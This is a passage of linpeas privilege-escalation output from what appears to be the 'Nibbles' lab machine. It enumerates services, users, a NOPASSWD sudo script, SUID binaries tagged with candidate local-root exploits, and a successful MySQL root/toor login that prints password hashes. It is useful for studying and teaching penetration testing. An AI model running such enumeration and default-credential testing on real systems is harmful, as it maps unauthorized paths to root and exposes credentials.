Sun 2025-04-27 06:52:52 EDT  4h 53min left Sat 2025-04-26 06:37:30 EDT  19h ago   apt-daily-upgrade.timer      apt-daily-upgrade.service
Mon 2025-04-28 02:37:58 EDT  24h left      Sat 2025-04-26 06:50:11 EDT  19h ago   snapd.refresh.timer          snapd.refresh.service
n/a                          n/a           n/a                          n/a       snap-repair.timer           
n/a                          n/a           n/a                          n/a       snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a           n/a                          n/a       ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                                                                                                    
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                                                                                                                                  
/etc/systemd/system/final.target.wants/snapd.system-shutdown.service could be executing some relative path                                                                                                                                  
/etc/systemd/system/multi-user.target.wants/networking.service could be executing some relative path
/etc/systemd/system/network-online.target.wants/networking.service could be executing some relative path
/etc/systemd/system/sysinit.target.wants/friendly-recovery.service could be executing some relative path
/lib/systemd/system/emergency.service could be executing some relative path
/lib/systemd/system/friendly-recovery.service could be executing some relative path
/lib/systemd/system/ifup@.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                                                                                                   
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                                                                                                 
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-bus-proxyd.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                                                                                                   
/run/acpid.socket                                                                                                                                                                                                                           
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                                                                                                     
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                                                                                                    
:1.0                                   1 systemd         root             :1.0          init.scope                -          -
:1.1                                 957 accounts-daemon[0m root             :1.1          accounts-daemon.service   -          -
:1.2                                1007 systemd-logind  root             :1.2          systemd-logind.service    -          -
:1.20                              51691 busctl          nibbler          :1.20         apache2.service           -          -
:1.3                                1030 polkitd         root             :1.3          polkitd.service           -          -
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -
org.freedesktop.Accounts             957 accounts-daemon[0m root             :1.1          accounts-daemon.service   -          -
org.freedesktop.DBus                 978 dbus-daemon[0m     messagebus       org.freedesktop.DBus dbus.service              -          -
org.freedesktop.PolicyKit1          1030 polkitd         root             :1.3          polkitd.service           -          -
org.freedesktop.hostname1              - -               -                (activatable) -                         -
org.freedesktop.locale1                - -               -                (activatable) -                         -
org.freedesktop.login1              1007 systemd-logind  root             :1.2          systemd-logind.service    -          -
org.freedesktop.network1               - -               -                (activatable) -                         -
org.freedesktop.resolve1               - -               -                (activatable) -                         -
org.freedesktop.systemd1               1 systemd         root             :1.0          init.scope                -          -
org.freedesktop.timedate1              - -               -                (activatable) -                         -
╔══════════╣ D-Bus config files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                                                                                                     
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)                                                                                                                                      
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.network1.conf (        <policy user="systemd-network">)
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.resolve1.conf (        <policy user="systemd-resolve">)



                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════                                                                                                                                                         
                              ╚═════════════════════╝                                                                                                                                                                                       
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                                                                                         
link-local 169.254.0.0
ens192    Link encap:Ethernet  HWaddr 00:50:56:94:02:7f  
          inet addr:10.129.96.84  Bcast:10.129.255.255  Mask:255.255.0.0
          inet6 addr: dead:beef::250:56ff:fe94:27f/64 Scope:Global
          inet6 addr: fe80::250:56ff:fe94:27f/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:212113 errors:0 dropped:0 overruns:0 frame:0
          TX packets:59141 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:30626882 (30.6 MB)  TX bytes:14739404 (14.7 MB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:894 errors:0 dropped:0 overruns:0 frame:0
          TX packets:894 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1 
          RX bytes:84220 (84.2 KB)  TX bytes:84220 (84.2 KB)


╔══════════╣ Hostname, hosts and DNS
Nibbles                                                                                                                                                                                                                                     
127.0.0.1       localhost
127.0.1.1       Nibbles

::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
nameserver 1.1.1.1
nameserver 8.8.8.8

╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports                                                                                                                                                
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                                                                                                           
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                                                                                          
                                                                                                                                                                                                                                            


                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════                                                                                                                                                         
                               ╚═══════════════════╝                                                                                                                                                                                        
╔══════════╣ My user
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users                                                                                                                                                     
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)                                                                                                                                                                                    

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
Matching Defaults entries for nibbler on Nibbles:                                                                                                                                                                                           
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#reusing-sudo-tokens                                                                                                                                       
ptrace protection is enabled (1)                                                                                                                                                                                                            

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/interesting-groups-linux-pe/index.html#pe---method-2                                                                                                                 
                                                                                                                                                                                                                                            
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             

╔══════════╣ Users with console
root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                             

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                                                                                                      
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-timesync) gid=102(systemd-timesync) groups=102(systemd-timesync)
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
uid=101(systemd-network) gid=103(systemd-network) groups=103(systemd-network)
uid=102(systemd-resolve) gid=104(systemd-resolve) groups=104(systemd-resolve)
uid=103(systemd-bus-proxy) gid=105(systemd-bus-proxy) groups=105(systemd-bus-proxy)
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=105(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=106(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=107(messagebus) gid=111(messagebus) groups=111(messagebus)
uid=108(uuidd) gid=112(uuidd) groups=112(uuidd)
uid=109(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=118(mysql) groups=118(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=5(games) gid=60(games) groups=60(games)
uid=6(man) gid=12(man) groups=12(man)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 01:59:44 up 23:26,  0 users,  load average: 0.25, 0.23, 0.09                                                                                                                                                                               
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
                                                                                                                                                                                                                                            
wtmp begins Sat Apr 26 06:25:02 2025

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                                                                                           
root             tty1                      Tue Nov 30 06:28:33 -0500 2021

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
                                                                                                                                                                                                                                            
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                                                                            


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                                                                          
                             ╚══════════════════════╝                                                                                                                                                                                       
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                                                                             
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/usr/bin/lxc
/usr/bin/make
/bin/nc
/bin/netcat
/usr/bin/perl
/usr/bin/php
/bin/ping
/usr/bin/python3
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  g++                                 4:5.3.1-1ubuntu1                           amd64        GNU C++ compiler                                                                                                                            
ii  g++-5                               5.4.0-6ubuntu1~16.04.5                     amd64        GNU C++ compiler
ii  gcc                                 4:5.3.1-1ubuntu1                           amd64        GNU C compiler
ii  gcc-5                               5.4.0-6ubuntu1~16.04.5                     amd64        GNU C compiler
/usr/bin/gcc
/usr/bin/g++

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.18 (Ubuntu)                                                                                                                                                                                      
Server built:   2017-09-18T15:09:02
httpd Not Found
                                                                                                                                                                                                                                            
Nginx version: nginx Not Found
                                                                                                                                                                                                                                            
/etc/apache2/mods-available/php5.6.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-available/php5.6.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-available/php5.6.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-available/php5.6.conf:    SetHandler application/x-httpd-php-source
--
/etc/apache2/mods-enabled/php5.6.conf-<FilesMatch ".+\.ph(p[3457]?|t|tml)$">
/etc/apache2/mods-enabled/php5.6.conf:    SetHandler application/x-httpd-php
--
/etc/apache2/mods-enabled/php5.6.conf-<FilesMatch ".+\.phps$">
/etc/apache2/mods-enabled/php5.6.conf:    SetHandler application/x-httpd-php-source
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Dec 10  2017 /etc/apache2/sites-enabled                                                                                                                                                                         
drwxr-xr-x 2 root root 4096 Dec 10  2017 /etc/apache2/sites-enabled
lrwxrwxrwx 1 root root 35 Dec 10  2017 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>


-rw-r--r-- 1 root root 1332 Mar 19  2016 /etc/apache2/sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
lrwxrwxrwx 1 root root 35 Dec 10  2017 /etc/apache2/sites-enabled/000-default.conf -> ../sites-available/000-default.conf
<VirtualHost *:80>
        ServerAdmin webmaster@localhost
        DocumentRoot /var/www/html
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

-rw-r--r-- 1 root root 74025 Dec  7  2017 /etc/php/5.6/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysql.allow_local_infile = On
mysql.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
sybct.allow_persistent = On
mssql.allow_persistent = On
-rw-r--r-- 1 root root 73701 Dec  7  2017 /etc/php/5.6/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
ibase.allow_persistent = 1
mysql.allow_local_infile = On
mysql.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
sybct.allow_persistent = On
mssql.allow_persistent = On



╔══════════╣ Analyzing MariaDB Files (limit 70)
                                                                                                                                                                                                                                            
-rw------- 1 root root 317 Dec 10  2017 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Sep 30  2013 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                                                                          
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Dec 28  2017 /etc/pam.d                                                                                                                                                                                         
-rw-r--r-- 1 root root 2133 Apr 28  2016 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                                                                        
drwxr-xr-x 2 root root 4096 Sep 22  2017 /etc/ldap


╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Sep 22  2017 /usr/share/keyrings                                                                                                                                                                                
drwxr-xr-x 2 root root 4096 Dec 10  2017 /var/lib/apt/keyrings




╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /usr/share/bash-completion/completions/postfix                                                                                                                                                      


╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                                                                                                            


-rw-r--r-- 1 root root 69 Dec  7  2017 /etc/php/5.6/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Dec  7  2017 /usr/share/php5.6-common/common/ftp.ini






╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Aug 31  2015 /etc/skel/.bashrc                                                                                                                                                                                  





-rw-r--r-- 1 root root 655 Jun 24  2016 /etc/skel/.profile




╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                                                                                                                            





















lrwxrwxrwx 1 root root 20 Dec 10  2017 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Dec 10  2017 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Dec 10  2017 /var/lib/dpkg/alternatives/my.cnf






























╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user              = mysql                                                                                                                                                             
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ MySQL version
mysql  Ver 14.14 Distrib 5.7.20, for Linux (x86_64) using  EditLine wrapper                                                                                                                                                                 


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... Yes                                                                                                                                                                                 
User    Host    authentication_string
root    localhost       *9CFBBC772F3F6C106020035386DA5BBBF1249A11
mysql.session   localhost       *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
mysql.sys       localhost       *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
debian-sys-maint        localhost       *0B46F5EC336AFB411DB534D6A50EA98C619B0DE4
═╣ MySQL connection using root/NOPASS ................. No
                                                                                                                                                                                                                                            
╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                                                                                
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
-rw-r--r-- 1 root root 12255 Jul 19  2016 /etc/apt/trusted.gpg
-rw-r--r-- 1 root root 364 Dec 10  2017 /etc/apt/trusted.gpg.d/ondrej_ubuntu_php.gpg
-rw------- 1 nibbler nibbler 0 Apr 27 01:57 /home/nibbler/.gnupg/pubring.gpg
-rw------- 1 nibbler nibbler 40 Apr 27 01:57 /home/nibbler/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 12335 May 18  2012 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 18  2012 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 0 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring-removed.gpg
-rw-r--r-- 1 root root 2294 Nov 11  2013 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 1227 May 18  2012 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2256 Feb 26  2016 /usr/share/popularity-contest/debian-popcon.gpg
-rw-r--r-- 1 root root 12335 Jul 19  2016 /var/lib/apt/keyrings/ubuntu-archive-keyring.gpg

drwx------ 2 nibbler nibbler 4096 Apr 27 01:57 /home/nibbler/.gnupg

╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                                                                              
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                                                                                 
                                                                                                                                                                                                                                            




-rw-r--r-- 1 root root 602 Sep 22  2017 /etc/ssh/ssh_host_dsa_key.pub
-rw-r--r-- 1 root root 174 Sep 22  2017 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 94 Sep 22  2017 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 394 Sep 22  2017 /etc/ssh/ssh_host_rsa_key.pub

Port 22
PermitRootLogin yes
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes

══╣ Possible private SSH keys were found!
/home/nibbler/.config/lxc/client.key

══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                                                                                                                                
/etc/ssl/certs/ACEDICOM_Root.pem
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AddTrust_External_Root.pem
/etc/ssl/certs/AddTrust_Low-Value_Services_Root.pem
/etc/ssl/certs/AddTrust_Public_Services_Root.pem
/etc/ssl/certs/AddTrust_Qualified_Certificates_Root.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
43045PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/doc/openssh-client/examples/sshd_config                                                                                                                                                                                          
AuthorizedKeysFile      .ssh/authorized_keys
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                                                                            


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes
    GSSAPIDelegateCredentials no

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-shell-sessions                                                                                                                                       
tmux 2.1                                                                                                                                                                                                                                    


/tmp/tmux-1001



                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                                                                          
                      ╚════════════════════════════════════╝                                                                                                                                                                                
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
-rwsr-xr-- 1 root messagebus 42K Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                                   
-rwsr-xr-x 1 root root 39K Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 419K Mar 16  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 15K Jan 17  2016 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-sr-x 1 root root 84K Nov 30  2017 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 134K Jul  4  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 49K May 16  2017 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 74K May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-xr-x 1 root root 39K May 16  2017 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 33K May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 23K Jan 17  2016 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
-rwsr-xr-x 1 root root 33K May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40K May 16  2017 /bin/su
-rwsr-xr-x 1 root root 31K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 139K Jan 28  2017 /bin/ntfs-3g  --->  Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
-rwsr-xr-x 1 root root 27K Jun 14  2017 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 44K May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40K Jun 14  2017 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                                                                                                                                             
-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/unix_chkpwd                                                                                                                                                                                 
-rwxr-sr-x 1 root shadow 35K Mar 16  2016 /sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-sr-x 1 root root 84K Nov 30  2017 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root tty 27K Jun 14  2017 /usr/bin/wall
-rwxr-sr-x 1 root shadow 23K May 16  2017 /usr/bin/expiry
-rwxr-sr-x 1 root utmp 425K Feb  7  2016 /usr/bin/screen  --->  GNU_Screen_4.5.0
-rwsr-sr-x 1 daemon daemon 51K Jan 14  2016 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root crontab 36K Apr  5  2016 /usr/bin/crontab
-rwxr-sr-x 1 root mlocate 39K Nov 18  2014 /usr/bin/mlocate
-rwxr-sr-x 1 root shadow 61K May 16  2017 /usr/bin/chage
-rwxr-sr-x 1 root tty 15K Mar  1  2016 /usr/bin/bsd-write
-rwxr-sr-x 1 root ssh 351K Mar 16  2017 /usr/bin/ssh-agent

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#acls                                                                                                                                                      
files with acls in searched folders Not Found                                                                                                                                                                                               
                                                                                                                                                                                                                                            
╔══════════╣ Capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities                                                                                                                                              
══╣ Current shell capabilities                                                                                                                                                                                                              
CapInh:  0x0000000000000000=                                                                                                                                                                                                                
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
CapAmb:  0x0000000000000000=

╚ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                                                                                                                                
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
